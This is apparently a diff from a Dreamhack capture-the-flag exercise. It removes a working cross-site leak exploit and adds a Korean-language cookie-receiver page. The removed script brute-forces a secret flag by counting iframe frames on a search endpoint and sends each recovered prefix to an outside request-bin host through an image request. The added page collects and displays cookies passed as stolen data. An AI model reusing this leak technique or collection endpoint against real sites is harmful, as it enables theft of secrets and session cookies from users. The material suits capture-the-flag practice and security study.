@@ -1,44 +1,23 @@
-<iframe id="iframe"></iframe>
-<img id="img">
-<script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
-                    return resolve();
-                else
-                    return reject();
-            };
-        });
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>쿠키 수신기</title>
+</head>
+<body>
+  <h1>💡 쿠키 수신됨:</h1>
+  <p id="cookie"></p>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const cookie = urlParams.get('c');
+    
+    if (cookie) {
+      console.log('[!] 쿠키 탈취됨: ' + cookie);
+      document.getElementById("cookie").innerText = cookie;
+    } else {
+      document.getElementById("cookie").innerText = "❌ c 파라미터가 없습니다.";
     }
-
-    async function search(query) {
-        try {
-            await req(
-              `http://localhost:8000/search?query=${query}`
-            );
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async function exploit() {
-        let chars = "0123456789abcdef}"
-        let secret = "DH{22d1445ad68e194e044a16dc6";
-
-        while (!secret.includes("}")) {
-            for (let c of chars) {
-                if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://gpyrelc.request.dreamhack.games/${secret}`;
-                    break;
-                }
-            }
-        }
-    }
-
-    exploit();
-</script>
+  </script>
+</body>
+</html>
